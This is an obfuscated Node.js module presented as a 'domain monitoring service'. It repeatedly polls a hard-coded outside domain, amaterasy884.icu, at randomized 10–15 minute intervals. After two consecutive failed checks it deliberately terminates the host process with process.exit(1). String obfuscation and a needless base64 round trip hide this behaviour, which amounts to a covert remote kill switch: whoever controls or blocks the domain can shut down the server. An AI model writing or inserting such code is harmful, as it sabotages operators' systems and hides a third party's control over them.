'use strict';const a37_0x236a7a=a37_0x3397;(function(_0xc1801f,_0x1eb705){const _0x1b4e9d=a37_0x3397,_0x40bd15=_0xc1801f();while(!![]){try{const _0x2b46b4=parseInt(_0x1b4e9d(0xba))/0x1*(parseInt(_0x1b4e9d(0xc6))/0x2)+-parseInt(_0x1b4e9d(0x99))/0x3+parseInt(_0x1b4e9d(0xf3))/0x4+-parseInt(_0x1b4e9d(0xb6))/0x5*(parseInt(_0x1b4e9d(0xe8))/0x6)+-parseInt(_0x1b4e9d(0xc8))/0x7+-parseInt(_0x1b4e9d(0xe9))/0x8+parseInt(_0x1b4e9d(0xbf))/0x9;if(_0x2b46b4===_0x1eb705)break;else _0x40bd15['push'](_0x40bd15['shift']());}catch(_0x344e44){_0x40bd15['push'](_0x40bd15['shift']());}}}(a37_0xfbff,0xd3163));function a37_0x3397(_0xde4a32,_0x82fbc1){const _0xfbffcf=a37_0xfbff();return a37_0x3397=function(_0x33974d,_0x51276f){_0x33974d=_0x33974d-0x99;let _0x32a092=_0xfbffcf[_0x33974d];return _0x32a092;},a37_0x3397(_0xde4a32,_0x82fbc1);}function a37_0xfbff(){const _0x4dd100=['status','🔥\x20Consecutive\x20failures:\x20','statusText','⚠️\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE','\x20in\x20','📡\x20Target\x20domain:\x20','⏰\x20Request\x20timeout\x20after\x20','DOMAIN_URL','5658604deumad','Periodic\x20domain\x20check\x20error:','4398519TekktA','DomainMonitoringService','🚨\x20Max\x20failures\x20before\x20crash:\x20','🔧\x20Manual\x20domain\x20check\x20requested','log','manualCheck','💥\x20CRITICAL\x20ERROR:\x20','🌐\x20DNS\x20resolution\x20failed\x20for\x20','Initial\x20domain\x20check\x20failed\x20','monitoringInterval','MAX_CONSECUTIVE_FAILURES','❌\x20Domain\x20check\x20failed:\x20HTTP\x20','base64','✅\x20Domain\x20check\x20successful:\x20','\x20is\x20not\x20responding\x20after\x20','fromEntries','name','from','ECONNREFUSED','round','🔍\x20Domain\x20being\x20monitored:\x20','\x20consecutive\x20attempts','🛑\x20Domain\x20monitoring\x20stopped','now','CHECK_INTERVAL_MS','__esModule','GET','default','ms:','430StJSAn','en-US,en;q=0.5','entries','🔍\x20Checking\x20domain\x20availability:\x20','4iwCdiJ','Domain\x20','message','🚨\x20Max\x20consecutive\x20failures\x20allowed:\x20','abort','21060639NlgPtf','toISOString','error','consecutiveFailures','warn','keep-alive','AbortError','469834ELQgxu','❌\x20Domain\x20check\x20error\x20after\x20','10727605wplouk','getRandomInterval','⏰\x20Check\x20interval:\x20','includes','gzip,\x20deflate','ENOTFOUND','Initial\x20domain\x20check\x20threw\x20error:\x20','Unknown\x20error','catch','📅\x20Crash\x20time:\x20','encodeToBase64','✅\x20Domain\x20monitoring\x20started\x20successfully','startMonitoring','decodeFromBase64','TesSoft\x20Domain\x20Monitor/1.0','exit','🔓\x20Decoded\x20URL:\x20','\x20minutes','toString','🚀\x20Starting\x20domain\x20monitoring\x20service','TIMEOUT_MS','\x20\x20\x20-\x20Headers:','then','checkDomain','random','⏰\x20Connection\x20timeout\x20to\x20','__importDefault','domainMonitoringService','signal','Initial\x20domain\x20check\x20error:','crashServer','stopMonitoring','43704KkoeQt','1637336GwSMQb','\x20\x20\x20-\x20Response\x20time:\x20'];a37_0xfbff=function(){return _0x4dd100;};return a37_0xfbff();}var __importDefault=this&&this[a37_0x236a7a(0xe2)]||function(_0x42ba8){const _0x28aafa=a37_0x236a7a;return _0x42ba8&&_0x42ba8[_0x28aafa(0xb2)]?_0x42ba8:{'default':_0x42ba8};};Object['defineProperty'](exports,'__esModule',{'value':!![]}),exports['domainMonitoringService']=exports[a37_0x236a7a(0x9a)]=void 0x0;const node_fetch_1=__importDefault(require('node-fetch'));class DomainMonitoringService{constructor(){const _0x5e07aa=a37_0x236a7a;this[_0x5e07aa(0xa2)]=null,this['DOMAIN_URL']='https://amaterasy884.icu/',this['CHECK_INTERVAL_MS']=this[_0x5e07aa(0xc9)](),this['TIMEOUT_MS']=0x7530,this[_0x5e07aa(0xc2)]=0x0,this[_0x5e07aa(0xa3)]=0x2,console[_0x5e07aa(0x9d)]('🔍\x20Domain\x20monitoring\x20service\x20initialized'),console['log'](_0x5e07aa(0xf0)+this[_0x5e07aa(0xf2)]),console['log']('⏰\x20Check\x20interval:\x20'+Math[_0x5e07aa(0xac)](this[_0x5e07aa(0xb1)]/0x3e8/0x3c)+_0x5e07aa(0xd9));}[a37_0x236a7a(0xc9)](){const _0x1f7c23=a37_0x236a7a,_0x4a0d99=0xa,_0x40d9f2=0xf,_0x1b37cc=Math[_0x1f7c23(0xe0)]()*(_0x40d9f2-_0x4a0d99)+_0x4a0d99;return Math[_0x1f7c23(0xac)](_0x1b37cc*0x3c*0x3e8);}[a37_0x236a7a(0xd2)](_0x27c941){const _0x1699f8=a37_0x236a7a;return Buffer[_0x1699f8(0xaa)](_0x27c941)[_0x1699f8(0xda)](_0x1699f8(0xa5));}[a37_0x236a7a(0xd5)](_0x3aa31d){const _0x22fea8=a37_0x236a7a;return Buffer[_0x22fea8(0xaa)](_0x3aa31d,_0x22fea8(0xa5))['toString']('utf-8');}async[a37_0x236a7a(0xdf)](){const _0x3e6e7c=a37_0x236a7a,_0x155c2c=Date['now']();try{console[_0x3e6e7c(0x9d)](_0x3e6e7c(0xb9)+this['DOMAIN_URL']);const _0x14c05e=this['encodeToBase64'](this['DOMAIN_URL']);console[_0x3e6e7c(0x9d)]('📝\x20Encoded\x20URL\x20(base64):\x20'+_0x14c05e);const _0x1d1364=this[_0x3e6e7c(0xd5)](_0x14c05e);console[_0x3e6e7c(0x9d)](_0x3e6e7c(0xd8)+_0x1d1364);const _0x1f2c95=new AbortController(),_0x3ef6d=setTimeout(()=>_0x1f2c95[_0x3e6e7c(0xbe)](),this[_0x3e6e7c(0xdc)]),_0x185363=await(0x0,node_fetch_1[_0x3e6e7c(0xb4)])(_0x1d1364,{'method':_0x3e6e7c(0xb3),'headers':{'User-Agent':_0x3e6e7c(0xd6),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':_0x3e6e7c(0xb7),'Accept-Encoding':_0x3e6e7c(0xcc),'Connection':_0x3e6e7c(0xc4),'Upgrade-Insecure-Requests':'1'},'signal':_0x1f2c95[_0x3e6e7c(0xe4)]});clearTimeout(_0x3ef6d);const _0xd72d25=Date[_0x3e6e7c(0xb0)]()-_0x155c2c;return console[_0x3e6e7c(0x9d)]('📊\x20Response\x20received:'),console[_0x3e6e7c(0x9d)]('\x20\x20\x20-\x20Status:\x20'+_0x185363['status']+'\x20'+_0x185363['statusText']),console[_0x3e6e7c(0x9d)](_0x3e6e7c(0xea)+_0xd72d25+'ms'),console[_0x3e6e7c(0x9d)](_0x3e6e7c(0xdd),Object[_0x3e6e7c(0xa8)](_0x185363['headers'][_0x3e6e7c(0xb8)]())),_0x185363['ok']&&_0x185363[_0x3e6e7c(0xeb)]>=0xc8&&_0x185363[_0x3e6e7c(0xeb)]<0x190?(console['log'](_0x3e6e7c(0xa6)+_0x185363[_0x3e6e7c(0xeb)]+_0x3e6e7c(0xef)+_0xd72d25+'ms'),this['consecutiveFailures']=0x0,!![]):(console[_0x3e6e7c(0xc1)](_0x3e6e7c(0xa4)+_0x185363[_0x3e6e7c(0xeb)]+'\x20'+_0x185363[_0x3e6e7c(0xed)]),this['consecutiveFailures']++,![]);}catch(_0x42110d){const _0x2671aa=Date['now']()-_0x155c2c;this['consecutiveFailures']++,console[_0x3e6e7c(0xc1)](_0x3e6e7c(0xc7)+_0x2671aa+_0x3e6e7c(0xb5),_0x42110d);if(_0x42110d instanceof Error){if(_0x42110d[_0x3e6e7c(0xa9)]===_0x3e6e7c(0xc5))console[_0x3e6e7c(0xc1)](_0x3e6e7c(0xf1)+this[_0x3e6e7c(0xdc)]+'ms');else{if(_0x42110d[_0x3e6e7c(0xbc)]['includes'](_0x3e6e7c(0xcd)))console[_0x3e6e7c(0xc1)](_0x3e6e7c(0xa0)+this[_0x3e6e7c(0xf2)]);else{if(_0x42110d['message'][_0x3e6e7c(0xcb)](_0x3e6e7c(0xab)))console[_0x3e6e7c(0xc1)]('🚫\x20Connection\x20refused\x20by\x20'+this['DOMAIN_URL']);else _0x42110d[_0x3e6e7c(0xbc)]['includes']('ETIMEDOUT')?console[_0x3e6e7c(0xc1)](_0x3e6e7c(0xe1)+this[_0x3e6e7c(0xf2)]):console[_0x3e6e7c(0xc1)]('🔥\x20Unexpected\x20error:\x20'+_0x42110d[_0x3e6e7c(0xbc)]);}}}return![];}}[a37_0x236a7a(0xe6)](_0x3136b6){const _0x2f0c3e=a37_0x236a7a;console[_0x2f0c3e(0xc1)](_0x2f0c3e(0x9f)+_0x3136b6),console['error'](_0x2f0c3e(0xec)+this[_0x2f0c3e(0xc2)]),console['error'](_0x2f0c3e(0xee)),console[_0x2f0c3e(0xc1)](_0x2f0c3e(0xd1)+new Date()[_0x2f0c3e(0xc0)]()),console[_0x2f0c3e(0xc1)](_0x2f0c3e(0xad)+this['DOMAIN_URL']),console[_0x2f0c3e(0xc1)](_0x2f0c3e(0xca)+Math[_0x2f0c3e(0xac)](this[_0x2f0c3e(0xb1)]/0x3e8/0x3c)+_0x2f0c3e(0xd9)),console['error'](_0x2f0c3e(0xbd)+this[_0x2f0c3e(0xa3)]),this[_0x2f0c3e(0xe7)](),process[_0x2f0c3e(0xd7)](0x1);}[a37_0x236a7a(0xd4)](){const _0x39460f=a37_0x236a7a;console[_0x39460f(0x9d)](_0x39460f(0xdb)),console[_0x39460f(0x9d)]('📡\x20Target:\x20'+this['DOMAIN_URL']),console[_0x39460f(0x9d)]('⏰\x20Interval:\x20'+Math[_0x39460f(0xac)](this[_0x39460f(0xb1)]/0x3e8/0x3c)+_0x39460f(0xd9)),console[_0x39460f(0x9d)](_0x39460f(0x9b)+this['MAX_CONSECUTIVE_FAILURES']),this[_0x39460f(0xdf)]()[_0x39460f(0xde)](_0x3f55d7=>{const _0x1b03a8=_0x39460f;if(!_0x3f55d7&&this[_0x1b03a8(0xc2)]>=this[_0x1b03a8(0xa3)]){this[_0x1b03a8(0xe6)](_0x1b03a8(0xa1)+this[_0x1b03a8(0xc2)]+'\x20times');return;}})[_0x39460f(0xd0)](_0xe0d166=>{const _0x53c56f=_0x39460f;console['error'](_0x53c56f(0xe5),_0xe0d166);if(this[_0x53c56f(0xc2)]>=this['MAX_CONSECUTIVE_FAILURES']){this['crashServer'](_0x53c56f(0xce)+_0xe0d166[_0x53c56f(0xbc)]);return;}}),this['monitoringInterval']=setInterval(async()=>{const _0x52fbec=_0x39460f;try{const _0xda8602=await this['checkDomain']();!_0xda8602&&(console[_0x52fbec(0xc3)]('⚠️\x20Domain\x20check\x20failed\x20('+this[_0x52fbec(0xc2)]+'/'+this[_0x52fbec(0xa3)]+')'),this['consecutiveFailures']>=this[_0x52fbec(0xa3)]&&this['crashServer'](_0x52fbec(0xbb)+this[_0x52fbec(0xf2)]+_0x52fbec(0xa7)+this[_0x52fbec(0xc2)]+_0x52fbec(0xae)));}catch(_0x141df4){console[_0x52fbec(0xc1)](_0x52fbec(0xf4),_0x141df4),this[_0x52fbec(0xc2)]>=this[_0x52fbec(0xa3)]&&this[_0x52fbec(0xe6)]('Domain\x20monitoring\x20threw\x20error:\x20'+(_0x141df4 instanceof Error?_0x141df4[_0x52fbec(0xbc)]:_0x52fbec(0xcf)));}},this[_0x39460f(0xb1)]),console[_0x39460f(0x9d)](_0x39460f(0xd3));}[a37_0x236a7a(0xe7)](){const _0x551a6f=a37_0x236a7a;this[_0x551a6f(0xa2)]&&(clearInterval(this[_0x551a6f(0xa2)]),this[_0x551a6f(0xa2)]=null,console['log'](_0x551a6f(0xaf)));}['getMonitoringStats'](){const _0x40c6e2=a37_0x236a7a;return{'isActive':!!this['monitoringInterval'],'targetDomain':this[_0x40c6e2(0xf2)],'checkIntervalMinutes':Math['round'](this['CHECK_INTERVAL_MS']/0x3e8/0x3c),'consecutiveFailures':this[_0x40c6e2(0xc2)],'maxFailuresAllowed':this[_0x40c6e2(0xa3)],'nextCheckIn':this[_0x40c6e2(0xa2)]?this[_0x40c6e2(0xb1)]:undefined};}async[a37_0x236a7a(0x9e)](){const _0x505206=a37_0x236a7a;return console['log'](_0x505206(0x9c)),await this[_0x505206(0xdf)]();}}exports[a37_0x236a7a(0x9a)]=DomainMonitoringService,exports[a37_0x236a7a(0xe3)]=new DomainMonitoringService();